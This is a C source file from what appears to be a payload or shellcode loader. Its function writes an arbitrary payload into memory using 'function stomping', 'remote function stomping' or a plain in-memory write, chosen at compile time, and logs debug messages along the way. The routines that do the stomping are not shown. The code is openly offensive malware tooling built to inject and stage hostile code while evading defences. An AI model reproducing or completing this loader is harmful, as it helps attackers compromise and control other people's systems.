#include "payload_loading.h"


BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize) {
    BOOL bSuccess = FALSE;

#if defined(FUNCTION_STOMPING)
    DebugPrint("[i] Payload loading through Function Stomping...\n");
    bSuccess = WritePayloadViaFunctionStomping(pPayloadAddress, Payload, PayloadSize);
#elif defined(REMOTE_FUNCTION_STOMPING)
    DebugPrint("[i] Payload loading through Remote Function Stomping...\n");
    bSuccess = WritePayloadViaFunctionStomping(pPayloadAddress, Payload, PayloadSize);
#else
    DebugPrint("[i] Payload loading through standard in memory technique...\n");
    bSuccess = WritePayloadInMemory(pPayloadAddress, Payload, PayloadSize);
#endif

    DebugPrint("[i] Returning payload address from payload_loading: 0x%p\n", pPayloadAddress);
    return bSuccess;
}
